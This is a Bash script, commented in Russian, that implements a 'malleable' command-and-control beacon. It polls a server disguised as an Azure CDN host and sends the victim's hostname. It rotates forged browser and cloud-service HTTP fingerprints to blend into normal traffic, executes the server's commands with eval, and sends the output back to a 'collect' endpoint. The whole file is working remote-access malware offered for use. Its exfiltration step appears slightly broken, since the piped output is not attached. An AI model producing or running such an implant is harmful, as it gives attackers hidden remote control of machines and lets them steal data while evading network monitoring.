#!/bin/bash
# MALLEABLE C2 SHADOWSTRIKE STYLE — не копия, а эволюция

SERVER=${1:-"cdn-update.azureedge.net"}
SLEEP=${2:-30}

# База профилей — не просто UA, а полные HTTP-отпечатки
declare -A PROFILES

PROFILES[google]='ua=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0|accept=text/html,application/xhtml+xml|lang=en-US,en;q=0.9|header=X-Client-Data: CI22yQEIo7bJAQjBtskBCKmdygEI+Z3KAQjLncoB'
PROFILES[cloudflare]='ua=Mozilla/5.0 (compatible; Cloudflare-Traffic-Manager/1.0)|accept=*/*|lang=en-US|header=CF-Connecting-IP: 10.0.0.1'
PROFILES[aws]='ua=Amazon CloudFront|accept=application/json|lang=en|header=X-Amz-Cf-Id: '"$(openssl rand -hex 16 2>/dev/null || echo 'test1234567890123456')"
PROFILES[azure]='ua=Azure-Edge/1.0|accept=*/*|lang=en|header=X-Azure-Ref: '"$(openssl rand -hex 12 2>/dev/null || echo 'test123456789012')"
PROFILES[nginx]='ua=nginx/1.25.0 (health check)|accept=*/*|lang=en|header=X-Real-IP: 127.0.0.1'
PROFILES[office365]='ua=Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17126)|accept=application/json|lang=en-US|header=X-Client-Version: 1416/1.0.0'

# Функция случайного выбора профиля
random_profile() {
    local keys=(${!PROFILES[@]})
    local random_key=${keys[$((RANDOM % ${#keys[@]}))]}
    echo "${PROFILES[$random_key]}"
}

# Функция генерации уникального гибрида (наша фишка!)
generate_hybrid() {
    local keys=(${!PROFILES[@]})
    local k1=${keys[$((RANDOM % ${#keys[@]}))]}
    local k2=${keys[$((RANDOM % ${#keys[@]}))]}
    
    # Берём UA от одного, accept от другого, заголовок от третьего
    local ua=$(echo "${PROFILES[$k1]}" | grep -oP 'ua=\K[^|]+')
    local accept=$(echo "${PROFILES[$k2]}" | grep -oP 'accept=\K[^|]+')
    
    echo "ua=$ua|accept=$accept|lang=en-US|header=X-Hybrid-ID: $(openssl rand -hex 8 2>/dev/null || echo 'hybrid12345678')"
}

# Основной цикл
echo "[MALLEABLE] Starting adaptive C2..."

while true; do
    # Случайно выбираем: готовый профиль или гибрид
    if [ $((RANDOM % 3)) -eq 0 ]; then
        # Уникальный гибрид — такого нет ни у кого
        PROFILE=$(generate_hybrid)
        echo "[MALLEABLE] Using HYBRID profile"
    else
        # Готовый профиль из базы
        PROFILE=$(random_profile)
        echo "[MALLEABLE] Using standard profile"
    fi
    
    UA=$(echo "$PROFILE" | grep -oP 'ua=\K[^|]+')
    ACCEPT=$(echo "$PROFILE" | grep -oP 'accept=\K[^|]+' || echo "*/*")
    LANG=$(echo "$PROFILE" | grep -oP 'lang=\K[^|]+' || echo "en-US,en;q=0.9")
    EXTRA_HEADER=$(echo "$PROFILE" | grep -oP 'header=\K.*' || echo "")
    
    # Отправляем запрос с профилем
    CMD=$(curl -sk --max-time 10 \
        -A "$UA" \
        -H "Accept: $ACCEPT" \
        -H "Accept-Language: $LANG" \
        -H "Cache-Control: max-age=0" \
        -H "Upgrade-Insecure-Requests: 1" \
        ${EXTRA_HEADER:+-H "$EXTRA_HEADER"} \
        "$SERVER/api/beacon?h=$(hostname | base64 -w0 | head -c8)&ts=$(date +%s)" 2>/dev/null)
    
    if [ -n "$CMD" ] && [ "$CMD" != "None" ]; then
        eval "$CMD" 2>&1 | head -c 500 | base64 -w0 | \
        curl -sk --max-time 10 -X POST \
            -A "$UA" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "v=1&t=event&data=" "$SERVER/api/collect" 2>/dev/null
    fi
    
    # Случайная смена профиля
    sleep $((SLEEP + RANDOM % 15))
done
